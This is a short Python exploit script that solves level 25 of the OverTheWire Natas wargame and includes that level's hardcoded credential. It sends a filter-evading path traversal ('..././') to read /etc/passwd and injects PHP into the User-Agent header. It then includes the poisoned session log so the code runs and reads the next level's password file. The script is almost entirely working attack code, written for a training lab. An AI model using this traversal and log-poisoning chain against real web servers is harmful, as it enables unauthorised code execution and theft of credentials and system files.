import re, requests
USER = 'natas25'
PASS = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'
URL = f'http://{USER}.natas.labs.overthewire.org/'
AUTH_BASIC = requests.auth.HTTPBasicAuth(USER, PASS)
burp = {"http": "http://127.0.0.1:8080"}

session = requests.Session()
user_agent = {'User-Agent': "<?php readfile('/etc/natas_webpass/natas26'); ?>"}
test = '?lang=/..././..././..././..././..././etc/passwd'
get = requests.get(url=URL + test, auth=AUTH_BASIC, headers=user_agent, proxies=burp)
cookies = str(get.cookies.copy)
regex_for_sid = re.search(r"(value=[^=]+')", cookies)
sid = regex_for_sid[0][7: -1]
payload = f'?lang=./..././..././..././..././..././var/www/natas/natas25/logs/natas25_{sid}.log'
request = requests.get(url=URL + payload, auth=AUTH_BASIC, headers=user_agent, proxies=burp)
response_http = request.text
flag = re.findall('([0-9a-zA-Z]{32})', response_http)
password = flag[1]

print('The password for the natas26 is:',password)